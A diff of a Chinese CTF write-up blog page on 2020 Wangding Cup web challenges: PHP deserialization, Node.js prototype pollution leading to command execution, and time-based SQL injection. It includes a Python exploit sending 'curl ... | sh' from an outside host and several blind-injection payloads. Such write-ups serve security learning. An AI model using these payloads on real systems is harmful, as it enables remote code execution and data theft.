@@ -80,11 +80,13 @@
           <div class="post-heading">
           	<span class="tags">
           	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
         </span>
             <h1>[网鼎杯 2020 青龙组]web</h1>
             <span class="meta">
             	Posted on
-              2020-05-10，6 min read
+              2020-05-10，7 min read
             </span>
           </div>
         </div>
@@ -97,8 +99,10 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <h1 id="areuserialz">AreUSerialz</h1>
-<p>题目给出了源码。是个反序列化。<br>
+          <p>AreUSerialz</p>
+<!-- more -->
+<p>====<br>
+题目给出了源码。是个反序列化。<br>
 大致就是op决定执行函数。filename是文件名。contents是文件内容。<br>
 有个文件读取。直接op=2。filename=flag.php就行了<br>
 由于PHP版本是7。而php7对于类的属性。并不敏感。题目中的protected属性。由于需要%00。所以不能直接用。可以改为public属性带入。</p>
@@ -225,14 +229,30 @@ edit_note(id, author, raw) {
 </code></pre>
 <p>这里先接受了post的一个author和raw和id<br>
 然后传入Edit_note函数。这里使用了undefsafe函数。<br>
-如果id传为为<code>__proto__</code>就存在参数链污染<br>
-<code>this.note_list.__proto__.author=author</code></p>
+如果id传为为<code>__proto__</code>就存在参数链污染</p>
 <pre><code>a = {'raw': 'curl http://tjxnb.com/1.html | sh', 'id': '__proto__', 'author': 'test'}
 import requests
 url = &quot;http://f13d06664e32474aad611a68000b395fba21a904678b4e4a.cloudgame2.ichunqiu.com:8080/&quot;
 print(requests.post(url+&quot;edit_note&quot;,json=a).text);
 print(requests.get(url+&quot;status&quot;).text);
 </code></pre>
+<p>赋值note_list。为<code>note_list.__proto__author='test'</code><br>
+那么我们在<code>for(let index in commands){console.log(commands[index])}</code><br>
+会把comamnds继承链上的东西都打印出来。那么在代码中。他会将这个值exec执行<br>
+从而变成了命令执行<br>
+<img src="https://guokeya.github.io/post-images/1589176058687.png" alt="" loading="lazy"></p>
+<h1 id="trace">trace</h1>
+<p>只有一个注册功能。<br>
+注入点在username处。<br>
+想到后台sql语句是<code>insert into user(name,pass) values('username','password')</code><br>
+开始构造sql语句为<code>',sleep(1))%23</code>成功延时<br>
+<code>',sleep(database()))%23</code>延时三秒。得到数据库长度<br>
+<code>',if((ascii(mid(database(),1,1)=99),sleep(1),1)))%23</code>得到数据库名ctf。<br>
+然后就没思路了。只能插入20个语句。并且过滤了information。一开始用innob的库去绕。发现版本不对。没这个库。然后用无列名注入。死在20个语句上。<br>
+114狮虎NB！！这里可以用pow(999,999)来造成报错。导致成功延时。报错没插入</p>
+<pre><code>if(ascii(substr((select `2` from (select 1,2 union select * from flag limit 1,1)x),1,1))=102, sleep(1),pow(999,999))
+</code></pre>
+<p>然而没环境了。</p>
 
           
           <p class="next-post">下一篇：
